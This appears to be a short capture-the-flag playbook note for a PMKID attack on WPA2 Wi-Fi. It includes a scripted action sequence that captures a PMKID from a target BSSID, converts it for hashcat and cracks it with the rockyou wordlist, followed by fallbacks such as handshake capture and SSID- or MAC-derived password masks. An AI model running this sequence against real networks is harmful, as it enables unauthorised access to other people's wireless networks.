# PMKID fastpath — the WCTF speedrun

## Recognition

Beacon RSN IE has PMKID Count > 0, or (more commonly) beacon says 0
but M1 in an actual association carries one. Best check: capture
one M1 with hcxdumptool and look at the EAPOL-Key IE.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},
    {"action": "capture_pmkid", "bssid": "AA:BB:CC:DD:EE:FF",
     "timeout_s": 60},
    {"action": "convert_to_hashcat", "mode": 22000,
     "pcap_path": "/tmp/pmkid.pcapng",
     "out_path": "/tmp/hs.22000"},
    {"action": "crack_start",
     "hash_path": "/tmp/hs.22000",
     "wordlist_path": "/opt/wordlists/rockyou.txt",
     "mode": 22000},
])
```

## The flag surface

The recovered PSK is almost always the flag directly. If it isn't,
it decrypts a target frame in the capture that contains the flag
(use Wireshark `wlan.enable_decryption` with the PSK + ESSID).

## When the fastpath breaks

- **AP suppresses PMKID.** `hcxpcapngtool --info` reports no PMKID
  hash lines. Fall back to 4-way capture via `capture_handshake`.
- **PSK not in rockyou.** Move to masks + SSID-derived wordlists
  (see cracking-tradecraft — future write). Try common patterns:
  `<vendor_prefix><4-digit><4-digit>`, MAC-suffix derivations.

## Cite

- attacks.json: `pmkid-capture`.
- Steube 2018.
